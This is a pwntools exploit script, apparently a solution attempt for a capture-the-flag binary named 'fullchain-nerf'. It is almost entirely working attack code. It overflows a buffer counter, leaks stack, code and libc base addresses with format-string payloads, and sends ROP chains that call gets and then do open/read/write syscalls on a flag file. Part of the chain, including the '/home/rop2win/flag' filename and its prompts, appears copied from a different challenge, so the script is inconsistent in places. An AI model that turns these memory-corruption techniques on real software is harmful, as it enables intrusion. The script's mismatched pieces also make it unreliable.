#!/usr/bin/python3
from pwn import *


context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']



r = process("./fullchain-nerf")


# cnt 
def buffer_overflow_cnt():
    r.sendlineafter("local > ",b'local')
    r.sendlineafter("write > ",b'read')
    r.sendlineafter("length > ",b'60') 
    r.send(b"A"*0x24 + p64(0x100))

def leakStackBaseAddress():
    r.sendlineafter("local > ",b'global')
    r.sendlineafter("write > ",b'read')
    r.sendlineafter("length > ",b'60')
    r.send(b"%p\x00")

    r.sendlineafter("local > ",b'global')
    r.sendlineafter("write > ",b'write')
    p =r.recvuntil("global")

    local_buffer_address =int(p[:p.find(b'global')].decode(),16)
    print("p",p)
    print("local_buffer_address",hex(local_buffer_address))

    # local_buffer_offset =    0x7fffcae27000 - 0x7fffcae25160
    # code_base_address = local_buffer_address + local_buffer_offset

    # print("code_base_address",hex(code_base_address))
    return local_buffer_address

def leakCodeBaseAddress():
    r.sendlineafter("local > ",b'global')
    r.sendlineafter("write > ",b'read')
    r.sendlineafter("length > ",b'60')
    r.send(b"%7$p\x00")

    r.sendlineafter("local > ",b'global')
    r.sendlineafter("write > ",b'write')
    p =r.recvuntil("global")

    global_buffer_address =int(p[:p.find(b'global')].decode(),16)
    print("p",p)
    print("global_buffer_address ",hex(global_buffer_address))

    global_buffer_offset =   0x55dc7db6c0a0 - 0x55dc7db68000  
    code_base_address = global_buffer_address - global_buffer_offset

    print("code_base_address",hex(code_base_address))
    return code_base_address

# r.sendlineafter("local > ",b'global')
def leakglobal_bufferAddress():
    r.sendlineafter("local > ",b'global')
    r.sendlineafter("write > ",b'read')
    r.sendlineafter("length > ",b'60')
    r.send(b"%7$p\x00")

    r.sendlineafter("local > ",b'global')
    r.sendlineafter("write > ",b'write')
    p =r.recvuntil("global")

    global_buffer_address =int(p[:p.find(b'global')].decode(),16)
    print("p",p)
    print("global_buffer_address ",hex(global_buffer_address))
    return global_buffer_address



def leakLibC(code_base_address):


    # elf = ELF('./fullchain-nerf')
    # poprdi = 0x00401493
    # puts_got = elf.got['puts']
    puts_got = 0x4030 + code_base_address
    # puts_plt = elf.plt['puts']
    puts_plt = 0x1120 + code_base_address
    pop_rdi = 0x16d3 + code_base_address
    # main = elf.sym['main']
    chal= 0x146a + code_base_address
    print("pop_rdi",hex(pop_rdi),"puts_got",hex(puts_got),"puts_plt",hex(puts_plt),"chal",hex(chal))
    rop = b'A'*0x24 + b'\x00'*4+ b'A'*0x10 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) +p64(chal)
    r.sendlineafter("local > ",b'local')
    r.sendlineafter("write > ",b'read')
    r.sendlineafter("length > ",b'96')
    r.send(rop)
    r.recvuntil(b'~')
    libc_address = r.recv().split()[0]
    
    puts_libc_address = u64(libc_address+b'\x00'*2)
    print("libc_address",puts_libc_address)
    # libc_address = r.recv()
    # print('libc_address',libc_address)
    # print('libc_address',hex(libc_address))
    puts_offset = 0x7fe1732545a0 - 0x7fe1731cd000 
    libc_address = puts_libc_address - puts_offset
    print("libc_address",hex(libc_address))

    # reset cnt
    r.sendline(b'local')
    r.sendlineafter("write > ",b'read')
    r.sendlineafter("length > ",b'60') 
    r.send(b"A"*0x24 + p64(0x100))
    return libc_address


def callGets(code_base_address,libc_address,local_stack_address):
    # local_stack_address = leakStackBaseAddress()
    print("call gets local_stack_address",hex(local_stack_address))


    pop_rdi_ret = 0x16d3 + code_base_address
    gets = 0x86af0 + libc_address
    chal= 0x146a + code_base_address
    pop_rsi_ret = 0x27529 + libc_address 
    pop_rdx_pop_rbx_ret = 0x162866   + libc_address
    pop_rax_ret = 0x4a550  + libc_address
    scanf = 0x1184 + code_base_address
    ret = 0x101a  + code_base_address
    print("scanf",hex(scanf))

    print("get address",hex(gets))

    # print("pop_rdi",hex(pop_rdi),"puts_got",hex(puts_got),"puts_plt",hex(puts_plt),"chal",hex(chal))
    #  pop_rdi_ret,3,
    #     pop_rsi_ret,fn,
    #     pop_rdx_ret,0x30,
    #     pop_rax_ret,0,
    #     syscall_ret,

    global_buffer_address = leakglobal_bufferAddress()
    # r.sendlineafter("local > ",b'global')
    # r.sendlineafter("write > ",b'read')
    # r.sendlineafter("length > ",b'60')
    # r.send(b"%100s\x00")

    padding = b'A'*0x24 + b'\x00'*4+ b'A'*0x10 
    rop = padding + flat(
        ret,
        pop_rdi_ret,global_buffer_address,
        gets,
        chal
    )
    print("rop",rop)
    r.sendlineafter("local > ",b'local')
    r.sendlineafter("write > ",b'read')
    r.sendlineafter("length > ",str(len(rop)).encode())
    gdb.attach(r)
    r.send(rop)
    

    r.sendline("ffffff")
    # reset cnt
    # r.sendlineafter("local > ",b'local')
    # r.sendlineafter("write > ",b'read')
    # r.sendlineafter("length > ",b'60') 
    # r.send(b"A"*0x24 + p64(0x100))
    return libc_address

def buildOpen_read_write_ROP(libc_address):
    new_rsp = 0x4c3300 # name
    leave_ret = 0x401dd0 # leave ; ret
    pop_rdi_ret = 0x40186a # pop rdi ; ret
    pop_rsi_ret = 0x40f40e # pop rsi ; ret
    pop_rax_ret = 0x4516c7 # pop rax ; ret
    pop_rdx_ret = 0x40176f # pop rdx ; ret

    syscall = libc_address + 0x2584d


    rop = b'A'*0x24 + b'A'*4+ b'A'*0x8 + p64(new_rsp) + p64(leave_ret) 
    r.sendlineafter("local > ",b'local')
    r.sendlineafter("write > ",b'read')
    r.sendlineafter("length > ",b'96')
    r.send(rop)




    ROP_addr = 0x4df360
    fn = 0x4df460

    pop_rdi_ret = 0x40186a
    pop_rsi_ret = 0x4028a8

    pop_rdx_ret = 0x40176f
    pop_rax_ret = 0x4607e7
    syscall_ret = 0x42cea4
    leave_ret = 0x401ebd

    ROP = flat(
        pop_rdi_ret, fn,
        pop_rsi_ret, 0,
        pop_rax_ret, 2,
        syscall_ret,

        pop_rdi_ret,3,
        pop_rsi_ret,fn,
        pop_rdx_ret,0x30,
        pop_rax_ret,0,
        syscall_ret,

        pop_rdi_ret,1,
        pop_rax_ret,1,
        syscall_ret,
    )

    r.sendafter('Give me filename: ', '/home/rop2win/flag\x00')
    r.sendafter('Give me ROP: ',b'A'*0x8 + ROP)
    r.sendafter('Give me overflow: ',b'A'*0x20  + p64(ROP_addr) + p64(leave_ret))







buffer_overflow_cnt()
code_base_address = leakCodeBaseAddress()
local_stack_address= leakStackBaseAddress()
local_stack_address = local_stack_address + 0x300
libc_address = leakLibC(code_base_address)
callGets(code_base_address,libc_address,local_stack_address)
# buffer_overflow_cnt()
print("---code_base_address",hex(code_base_address))
print("---stack_base_address",hex(local_stack_address))
print("---libc_address",hex(libc_address))


r.interactive()